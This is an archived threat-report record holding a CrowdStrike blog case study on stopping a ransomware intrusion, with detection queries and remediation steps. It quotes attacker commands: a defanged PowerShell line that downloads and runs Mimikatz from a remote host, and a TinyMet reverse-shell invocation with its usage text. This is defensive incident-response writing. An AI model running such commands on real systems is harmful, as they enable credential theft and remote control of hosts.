{
    "id": "567ca594-92cd-4b1f-a750-9a7784f5396b",
    "created_at": "2023-01-12T15:10:59.401878Z",
    "updated_at": "2025-03-27T02:05:45.555573Z",
    "deleted_at": null,
    "sha1_hash": "c945f16cb8b851ac63e51415c03d5a1589dc9436",
    "title": "2021-05-11 - Response When Minutes Matter- Rising Up Against Ransomware",
    "authors": "",
    "file_creation_date": "2022-05-28T23:11:37Z",
    "file_modification_date": "2022-05-28T23:11:37Z",
    "file_size": 1477340,
    "plain_text": "# How Falcon Complete Stopped a Big Game Hunting Ransomware Attack\n\n**[crowdstrike.com/blog/how-falcon-complete-stopped-a-big-game-hunting-ransomware-attack/](https://www.crowdstrike.com/blog/how-falcon-complete-stopped-a-big-game-hunting-ransomware-attack/)**\n\nFalcon Complete Team May 11, 2021\n\nThis blog describes a recent incident that highlights the CrowdStrike Falcon Complete™\nteam’s ability to act as an extension of a customer’s security team to quickly detect, triage\nand contain an active attacker before it was able to achieve its goal. In this example, we\noutline how a fast, coordinated response by the Falcon Complete, Falcon OverWatch™\nthreat hunting and CrowdStrike® Intelligence teams — over a holiday weekend — stopped a\n[big game hunting ransomware actor in its tracks. This response methodology protects our](https://www.crowdstrike.com/cybersecurity-101/cyber-big-game-hunting/)\ncustomers 24/7/365 and delivers on the CrowdStrike promise: We stop breaches.\n\n## The Initial Detection\n\nThe CrowdStrike Falcon® agent identified that “a process attempted to download a file using\nbitsadmin in an unusual way,” which caused a “High” alert within the Falcon UI and the\nFalcon Complete team’s queue.\n\n\n-----\n\n_Figure 1. Process tree for the initial detection_\n\n[The high severity quickly caught the attention of Falcon Complete, and after expanding the](https://www.crowdstrike.com/endpoint-security-products/falcon-complete/)\nprocess tree within the Falcon UI, analysts’ suspicions of ongoing nefarious activities were\nraised. The team quickly identified initial reconnaissance commands, followed immediately\nby a pivot into a “living off the land” technique of abusing bitsadmin.exe to download an\nunknown file. (“Living off the land” is a well-known technique where threat actors use built-in\nfeatures to slip under the radar of less sophisticated endpoint detection and response (EDR)\nsolutions.)\n\nSpawning from wmiprvse.exe, which suggests WMI lateral movement, bitsadmin — an inbuilt\nWindows Administrator tool commonly used by threat actors to download files — was used\nto download the unknown file “cmk.ex” from the a remote address via port 81 to\nC:\\Users\\Public\\Pictures\\cmk.ex. This file was then renamed, using the Windows tool\n“move,” to a Windows-recognized executable extension file “cmk.exe.” The use of port 81\nand a non-standard executable extension, which was then locally renamed, was assessed to\nbe an attempt to avoid detection by potential network intrusion detection systems.\n\nOnce renamed, the file was executed with the command line “cmk.exe 1 <REMOTE IP> 80.”\nUtilizing unique strings appearing within the binary obtained via using the utility strings,\nFalcon Complete determined that the file was a custom-compiled, packed and heavily\nobfuscated version of the tool TinyMet.\n```\nTinyMet\nUsage: tinymet.exe [transport] LHOST LPORT\nAvailable transports are as follows:\n  0: reverse_tcp\n  1: reverse_http\n  2: reverse_https\n  3: bind_tcp\n\n```\n\n-----\n\n_Figure 2. Usage for TinyMet.exe, from the GitHub repo_\n\nAt this stage, the Falcon Complete team was confident that this activity was not benign and\nbegan a quick and calculated remediative effort to remove the threat without causing an\nunnecessary negative business impact. Falcon Complete began by killing and remediating\ncmk.exe to ensure its added capabilities were not available to the threat actor.\n\nHowever, shortly after the removal of the cmk.exe file, Falcon blocked and alerted on a WMI\nlateral movement attempting to spawn and run a PowerShell downgrade attack followed by\nan attempted download and execution of the post-exploitation tool Mimikatz.\n```\niex((new-object\nnet.webclient).DownloadString('hxxps[://]raw[.]githubusercontent[.]com/PowerShellMafia\nMimikatz[.]ps1'))\n\n```\n_Figure 3. Command line for the Mimikatz detection_\n\nAt this point, Falcon Complete assessed that the risk posed to the host and the environment\nwas too high to allow attempts to continue while investigating. Therefore, the preventive step\nof network containment was taken against the host. This denied all access to the host, other\n[than via the Falcon platform, and gave Falcon Complete time to safely delve into the](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/)\ndetection data.\n\nFrom here, Falcon Complete re-pivoted the investigation into the extensive investigation\ntoolset within the Falcon UI — including User Search and Endpoint Activity Monitoring (EAM)\n— to gain further context and determine the origin of the activity.\n\n## Finding Patient Zero\n\nAs identified, WMI was being used to laterally move from another host, and Falcon Complete\nnow began to dig to find Patient Zero and any files or commands that had been run on the\nhost.\n\n[The lightweight CrowdStrike Falcon agent provides a rich source of EDR telemetry that](https://www.crowdstrike.com/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/)\nprovides critical insights into the behavior of each endpoint. Our EAM application gives the\nFalcon Complete team and Falcon customers the ability to search this execution data in real\ntime to quickly investigate and scope the extent of compromise for an incident.\n\nThis telemetry, combined with pre-defined reporting in Falcon’s Investigate app, enabled the\nFalcon Complete team to identify compromised user accounts and the original source of the\nthreat actor’s activity.\n\n[During the investigation, Falcon OverWatch simultaneously pushed a detection to the Falcon](https://www.crowdstrike.com/endpoint-security-products/falcon-overwatch-threat-hunting/)\nComplete team for review — it involved additional lateral movement attempts from an IP that\ndid not have the Falcon agent installed, leveraging PSExec to run reconnaissance\ncommands on further hosts, and write a binary with the name “info.zip.”\n\n\n-----\n\n_Figure 4. Process tree for the Falcon OverWatch alert_\n\nWith the attacker methodology flagged by Falcon OverWatch, the Falcon Complete team\nwas able to use specialized EAM searches to track the activity to a specific system on the\nnetwork.\n```\nevent_simpleName=ProcessRollup2 (FileName=psexecsvc.exe OR FileName=wsmprovhost.exe)\n| stats values(FileName) AS Parent, values(CommandLine) AS ParentCmd by ComputerName\nTargetProcessId_decimal\n| join aid TargetProcessId_decimal\n  [ search ProcessRollup2\n  | stats values(FileName) AS FileName,\nvalues(CommandLine) AS ChildCommand by ComputerName ParentProcessId_decimal\n  | rename FilePath AS ChildPath\n| eval TargetProcessId_decimal=ParentProcessId_decimal ]\n\n```\n_Figure 5. Falcon EAM Query for all PSExec lateral movement telemetry data_\n\nArmed with the origin system, it was possible to use Host Search in the Investigate app to\nidentify the most recently logged-on user, which allowed a further pivot to User Search to\nidentify where the compromised account had been used to log in to other systems via\nlegitimate Windows means.\n\n\n-----\n\nDue to the telemetry available from the Falcon sensor in the environment, the living off the\nland” attempt did not work.\n```\nevent_simpleName=UserLogon (LogonType_decimal=\"3\" OR LogonType_decimal=\"10\") | eval\ntimestamp=(timestamp / 1000)\n| convert timeformat=\"%FT%H:%M:%S.%3N UTC\" ctime(timestamp) AS timestamp_readable |\nstats count AS Count, min(timestamp_readable) AS \"First Logon\",\nmax(timestamp_readable) AS \"Last Logon\", values(UserPrincipal) AS UserPrincipal by\nUserName, ComputerName\n| sort timestamp_readable\n\n```\n_Figure 6. Falcon EAM Query for all RDP logon telemetry data/span>_\n\nBecause logon events are closely tracked by the Falcon agent, and we know that using tools\nsuch as PSExec and RDP (Remote Desktop Protocol) generate Type 3 or Type 10 logon\nevents within the data collected by Falcon (and Windows event logs), we can use this\nknowledge and Falcon’s event data to more quickly obtain valuable information normally\ntracked in Windows logs.\n\nIn this case, we can obtain the logon times, source network address and username that are\nbeing used by the threat actor and use this information to inform actions taken by the Falcon\nComplete team, as well as those undertaken by the customer.\n\nUsing the above query, the Falcon Complete team was able to build a complete picture of\nthe compromised account within minutes and identify Patient Zero — the compromised\nsystem and user that was the source of the RDP logons and PSExec commands.\n\nFalcon Complete noted during the investigation that during nearly all of the lateral movement\nattempts by the threat actor, regardless of execution method, the parent process was\n_WMIPrvSE.exe — the windows binary responsible for executing remote WMI calls._\n\nA further query could be used to confirm our suspicions and ensure that Patient Zero was\nsuccessfully identified.\n```\nevent_simpleName=WmiCreateProcess | eval timestamp=(timestamp / 1000)\n| convert timeformat=\"%FT%H:%M:%S.%3N UTC\" ctime(timestamp) AS ExecutionTime\n| table ExecutionTime, ComputerName, RemoteAddressIP4, LocalAddressIP4, CommandLine\n| sort ExecutionTime\n\n```\n_Figure 7. Falcon EAM Query, which provides all remote WMI executions and sorts by time in_\n_an environment_\n\nArmed with data confirming Patient Zero via several “living off the land” techniques leveraged\nby the threat actor, Falcon Complete was able to confidently assess the source of the\nintrusion, begin to implement policies that would slow the actor, and inform the customer of\nactions to be taken to fully remove the threat from the environment, such as installing the\nFalcon agent on the source host so that network containment and remediation could begin at\nthe source\n\n\n-----\n\nBecause Falcon Complete sees a wide range of adversarial threats daily, we can develop\nqueries such as those shown to enable fast triage and response to detections in situations\nwhere every minute matters.\n\n## The Remediation\n\nIn this case, the threat was an active hands-on-keyboard attack, and after non-businessdisruptive remediation proved unsuccessful, Falcon Complete opted to network-contain\nhosts that the threat actor had access to. This led to five hosts being contained in the\nenvironment. Once contained, all artifacts, including executables and persistence, were\nremediated from the hosts.\n\nTo ensure full remediation, actions that needed to be taken outside of the scope of the\nFalcon sensor were escalated to the customer:\n\nDisabling of compromised account\nBlocking threat actor infrastructure at perimeter firewalls\nInstallation of the Falcon sensor onto Patient Zero\n\nDue to this activity being both over a holiday weekend and after-hours for the customer, we\ndid not receive immediate responses from our escalations. As a result, and to help contain\nthe threat actor, Falcon Complete implemented a custom indicator of attack (IOA) that would\ndetect, in real time, any connections from the unmanaged Patient Zero device or the\ncommand and control (C2) identified. This would allow immediate investigation and response\nbefore the threat actor could take any meaningful action on the newly accessed host. To\nfurther this custom IOA, all bespoke tools used by the threat actor were blocklisted in the\nFalcon UI.\n\n_Figure 8. Falcon detection showing blocked C2 connection_\n\nOnce we received replies from the customer shortly thereafter, the customer was able to\nquickly install the Falcon sensor onto the unmanaged Patient Zero due to the Falcon\nplatform’s lightweight, single agent architecture. Immediately, Falcon Complete began to use\n\n\n-----\n\nthe Falcon Real Time Response (RTR) functionality to triage the host. With the intelligence\nand TTPs gained from the investigation, Falcon Complete was quickly able to pivot into the\nknown locations the threat actor stored tools and data.\n\nFalcon Complete located a number of reconnaissance files, including lists of 50 internal IP\naddresses as well as bespoke scripts to build the toolset observed on the hosts previously\nremediated. Again, Falcon Complete remediated the malicious tools and threat-actorgathered intelligence on this host.\n\nOnce Patient Zero was remediated and the compromised account disabled, this instance of\nthe threat could be considered successfully neutralized.\n\n## CrowdStrike Intelligence Analysis\n\nPer the standard procedure of the Falcon Complete team, we provided the CrowdStrike\nIntelligence team with samples of the cmk.exe and info.zip files, as well as the network\nindicators identified during the\ninvestigation.\n\nOf interest to our investigation was that the Intelligence team identified that the staging IP\naddress was also hosting an additional file on port 81 named 2.zip, which contained a binary\nidentified as a known ransomware variant.\n\nWhile the CrowdStrike Intelligence team does not specifically attribute this attack to any\n[named adversaries or any specific ransomware-as-a-service (RaaS) affiliate, the quick](https://www.crowdstrike.com/cybersecurity-101/ransomware/ransomware-as-a-service-raas/)\nactions from the Falcon Complete team prevented this customer from almost certainly\nbecoming a victim of a big game hunting ransomware operation.\n\n## Summary\n\nFalcon Complete initially identified an executable download of TinyMet and the attempted\nexecution of a TCP reverse shell within our customer’s environment. Using Process Explorer\nas well as EAM, we were able to identify multiple attempts at lateral movement from a host\nthat did not have the Falcon sensor installed.\n\nFalcon Complete then used the Host Search functionality to identify the compromised user\ncredentials before pivoting to User Search to identify where the compromised user account\nwas being used for lateral movement. This allowed us to place those hosts into network\n[containment, as well as block lateral movement attempts from the host without the Falcon](https://www.crowdstrike.com/cybersecurity-101/lateral-movement/)\nsensor. We were able to block the threat actor’s malicious executables and stop them in their\ntracks. These quick actions protected our customer and almost certainly prevented them\nfrom falling victim to a ransom attempt.\n\n\n-----\n\nAll of this malicious activity and the Falcon Complete team s response and remediation\nhappened over a holiday weekend, showing the importance of 24/7/365 security monitoring\nin a corporate environment and the power of partnering with CrowdStrike and Falcon\nComplete. The Falcon Complete team’s response methodology provides these kinds of\nresults for our customers at all hours of every day to stop breaches.\n\nWe look forward to sharing more case studies and providing some best practices for quick\nand effective incident response.\n\n**Additional Resources**\n\n_Learn more by visiting the_ _[Falcon Complete product webpage.](https://www.crowdstrike.com/endpoint-security-products/falcon-complete/)_\n_Read a white paper:_ _CrowdStrike Falcon Complete: Instant Cybersecurity Maturity for_\n_Organizations of All Sizes._\n_[Test CrowdStrike next-gen AV for yourself: Start your free trial of Falcon Prevent™.](https://go.crowdstrike.com/try-falcon-prevent.html)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-11 - Response When Minutes Matter- Rising Up Against Ransomware.pdf"
    ],
    "report_names": [
        "2021-05-11 - Response When Minutes Matter- Rising Up Against Ransomware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536259,
    "ts_updated_at": 1743041145,
    "ts_creation_date": 1653779497,
    "ts_modification_date": 1653779497,
    "files": {
        "pdf": "https://archive.orkl.eu/c945f16cb8b851ac63e51415c03d5a1589dc9436.pdf",
        "text": "https://archive.orkl.eu/c945f16cb8b851ac63e51415c03d5a1589dc9436.txt",
        "img": "https://archive.orkl.eu/c945f16cb8b851ac63e51415c03d5a1589dc9436.jpg"
    }
}